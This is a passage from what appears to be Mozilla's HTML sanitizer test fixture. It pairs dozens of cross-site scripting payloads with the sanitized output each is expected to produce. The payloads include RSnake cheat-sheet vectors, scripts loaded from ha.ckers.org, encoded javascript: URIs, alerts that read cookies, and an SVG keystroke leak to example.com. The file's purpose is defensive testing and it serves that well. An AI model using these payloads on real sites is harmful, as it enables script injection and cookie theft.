    data: '<math href="javascript:alert(1)">CLICKME</math>\r\n\r\n<math>\r\n<!-- up to FF 13 -->\r\n<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>\r\n\r\n<!-- FF 14+ -->\r\n<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>\r\n</math>',
    sanitized:
      '<html><head></head><body><math>CLICKME</math>\n\n<math>\n\n<maction actiontype="statusline#http://google.com">CLICKME</maction>\n\n\n<maction actiontype="statusline">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math></body></html>',
  },
  {
    data: "<b>drag and drop one of the following strings to the drop box:</b>\r\n<br/><hr/>\r\njAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\r\n<br/><hr/>\r\nfeed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\r\n<br/><hr/>\r\nfeed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>\r\n<br/><hr/>\r\nfeed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\r\n<br/><hr/>\r\n<div id=\"dropbox\" style=\"height: 360px;width: 500px;border: 5px solid #000;position: relative;\" ondragover=\"event.preventDefault()\">+ Drop Box +</div>",
    sanitized:
      "<html><head></head><body><b>drag and drop one of the following strings to the drop box:</b>\n<br><hr>\njAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br><hr>\nfeed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br><hr>\nfeed:data:text/html,&lt;script&gt;alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&lt;/script&gt;&lt;b&gt;\n<br><hr>\nfeed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br><hr>\n<div id=\"dropbox\">+ Drop Box +</div></body></html>",
  },
  {
    data: '<!doctype html>\r\n<form>\r\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\r\n<br>\r\n<input name="secret" type="password">\r\n</form>\r\n<!-- injection --><svg height="50px">\r\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\r\n<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />\r\n<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />\r\n<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />\r\n<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />\r\n</image>\r\n</svg>',
    sanitized:
      "<!DOCTYPE html>\n<html><head></head><body>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n\n\n\n\n\n\n\n\n\n</body></html>",
  },
  {
    data: "<!-- `<img/src=xx:xx onerror=alert(1)//--!>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<xmp>\r\n<%\r\n</xmp>\r\n<img alt='%></xmp><img src=xx:x onerror=alert(1)//'>\r\n\r\n<script>\r\nx='<%'\r\n</script> %>/\r\nalert(2)\r\n</script>\r\n\r\nXXX\r\n<style>\r\n*['<!--']{}\r\n</style>\r\n-->{}\r\n*{color:red}</style>",
    sanitized:
      '<html><head></head><body>\n&lt;%\n\n<img alt="%&gt;&lt;/xmp&gt;&lt;img src=xx:x onerror=alert(1)//">\n\n %&gt;/\nalert(2)\n\n\nXXX\n\n--&gt;{}\n*{color:red}</body></html>',
  },
  {
    data: '<form action="" method="post">\r\n<input name="username" value="admin" />\r\n<input name="password" type="password" value="secret" />\r\n<input name="injected" value="injected" dirname="password" />\r\n<input type="submit">\r\n</form>',
    sanitized: "<html><head></head><body>\n\n\n\n\n</body></html>",
  },
  {
    data: "<SCRIPT>alert('XSS');</SCRIPT>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "'';!--\"<XSS>=&{()}",
    sanitized: "<html><head></head><body>'';!--\"=&amp;{()}</body></html>",
  },
  {
    data: "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IMG SRC=\"javascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=javascript:alert('XSS')>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    sanitized: "<html><head></head><body>SRC=\n<img></body></html>",
  },
  {
    data: "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=\"javascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IMG SRC=\"javascript:alert('XSS')\"",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<SCRIPT>a=/XSS/",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "\\\";alert('XSS');//",
    sanitized: "<html><head></head><body>\\\";alert('XSS');//</body></html>",
  },
  {
    data: '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<BODY ONLOAD=alert('XSS')>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IMG DYNSRC=\"javascript:alert('XSS')\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<IMG LOWSRC=\"javascript:alert('XSS')\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<BGSOUND SRC=\"javascript:alert('XSS');\">",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<BR SIZE=\"&{alert('XSS')}\">",
    sanitized: "<html><head></head><body><br></body></html>",
  },
  {
    data: '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<IMG SRC="mocha:[code]">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<IMG SRC="livescript:[code]">',
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="Link" Content="<javascript:alert(\'XSS\')>; REL=stylesheet">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
    sanitized: "<html><head></head></html>",
  },
  {
    data: "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
    sanitized: "<html><head></head><body><table></table></body></html>",
  },
  {
    data: "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
    sanitized: "<html><head></head><body><div></div></body></html>",
  },
  {
    data: "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
    sanitized: "<html><head></head><body><div></div></body></html>",
  },
  {
    data: "<DIV STYLE=\"width: expression(alert('XSS'));\">",
    sanitized: "<html><head></head><body><div></div></body></html>",
  },
  {
    data: "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
    sanitized: "<html><head></head><body><img></body></html>",
  },
  {
    data: "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: 'exp/*<XSS STYLE=\'no\\xss:noxss("*//*");',
    sanitized: "<html><head></head><body>exp/*</body></html>",
  },
  {
    data: "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
    sanitized: '<html><head></head><body><a class="XSS"></a></body></html>',
  },
  {
    data: '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<BASE HREF=\"javascript:alert('XSS');//\">",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "getURL(\"javascript:alert('XSS')\")",
    sanitized:
      "<html><head></head><body>getURL(\"javascript:alert('XSS')\")</body></html>",
  },
  {
    data: 'a="get";',
    sanitized: '<html><head></head><body>a="get";</body></html>',
  },
  {
    data: "<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('XSS');\">",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<HTML><BODY>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<? echo('<SCR)';",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;">',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
    sanitized:
      "<html><head> </head><body>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</body></html>",
  },
  {
    data: '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC',
    sanitized: "<html><head></head><body>PT SRC</body></html>",
  },
  {
    data: "",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<dialog>allowed</dialog>",
    sanitized:
      "<html><head></head><body><dialog>allowed</dialog></body></html>",
  },
  {
    data: "<main>allowed</main>",
    sanitized: "<html><head></head><body><main>allowed</main></body></html>",
  },
  {
    data: "<picture>allowed</picture>",
    sanitized:
      "<html><head></head><body><picture>allowed</picture></body></html>",
  },
  {
    data: "<template>allowed</template>",
    sanitized:
      "<html><head><template>allowed</template></head><body></body></html>",
  },
  {
    // traverse into HTML template elements
    data: '<template><img src="x" onerror="alert(1)"></template>',
    sanitized:
      "<html><head><template><img></template></head><body></body></html>",
  },
  {
    // do not traverse into SVG template elements (that's not a thing)
    data: "<svg><template></template></svg>",
    sanitized: "<html><head></head><body></body></html>",
  },
  {
    data: "<svg><use href='http://example.com/test.svg'></svg>",
    flags: 0,
    sanitized: "<html><head></head><body><svg><use></use></svg></body></html>",
  },
  {
    // fragments that reference the same document are allowed.
    data: "<svg><use href='#x'></svg>",
    flags: 0,
    sanitized:
      '<html><head></head><body><svg><use href="#x"></use></svg></body></html>',
  },
  {
    data: '<svg><use xlink:href="http://example/#baz"/></svg>',
    flags: 0,
    sanitized: "<html><head></head><body><svg><use></use></svg></body></html>",
  },
  {
    // xlink:arcrole is not in the sanitizer's allowed xlink attribute list,
    // so it must be removed.
    data: '<svg><a xlink:arcrole="foo">bar</a></svg>',
    flags: 0,
    sanitized: "<html><head></head><body><svg><a>bar</a></svg></body></html>",
  },
  {
    // xlink:role is also not in the allowed list and must be removed.
    data: '<svg><a xlink:role="foo">bar</a></svg>',
    flags: 0,
    sanitized: "<html><head></head><body><svg><a>bar</a></svg></body></html>",
  },
  {
    // Allowed xlink attribute (xlink:title) should be preserved.
    data: '<svg><a xlink:title="foo">bar</a></svg>',
    flags: 0,
    sanitized:
      '<html><head></head><body><svg><a xlink:title="foo">bar</a></svg></body></html>',
  },
  {
    data: `<div is="custom-div">foo</div>`,
    sanitized: "<html><head></head><body><div>foo</div></body></html>",
  },
  {
    data: `<body><style is="custom-style">* { color: red; }</style></body>`,
    flags: Ci.nsIParserUtils.SanitizerAllowStyle,
    sanitized:
      "<html><head></head><body><style>* { color: red; }</style></body></html>",
  },
];
